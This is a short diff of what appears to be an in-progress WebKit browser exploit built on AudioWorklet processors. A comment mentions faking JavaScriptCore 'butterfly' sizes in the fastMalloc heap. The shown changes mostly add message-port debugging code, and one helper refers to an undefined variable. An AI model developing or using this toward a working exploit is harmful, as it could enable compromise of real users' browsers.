@@ -10,7 +10,7 @@ alert("hey");
 registerProcessor("a", class {
         constructor() {
           // setup a message port to the main thread
-          //port = new AudioWorkletProcessor().port;
+          port = new AudioWorkletProcessor().port;
           // this part is magic
           // put 0xfffe000000001337 in the fastMalloc heap to fake the butterfly sizes
           eval('1 + 0x1336');
@@ -26,8 +26,18 @@ registerProcessor("b", class {
       });
 
      
-`],{type:'text/javascript'})));
+`],{type:'text/javascript'}))).then(async () => {
 alert("hey")
 var node1 = new AudioWorkletNode(audioContext, 'a');
 var node2 = new AudioWorkletNode(audioContext, 'b');
+        node1.port.onmessage = (e) => {
+                alert(e.data);
+        }
+        let print = (msg) => { //Hoping this work around works as alert() seems to be undefined in the context of new Blob[] why?
+                //I honestly dont know maybe its like eval but in the context of thread running... or maybe it got something to do 
+                //With the fact Blob() takes a type of the language to be set in this sense it's 'text/javascript'
+                wa.port.postMessage(msg);
+        }
+        print("testing") //test it here
+}
 </script>
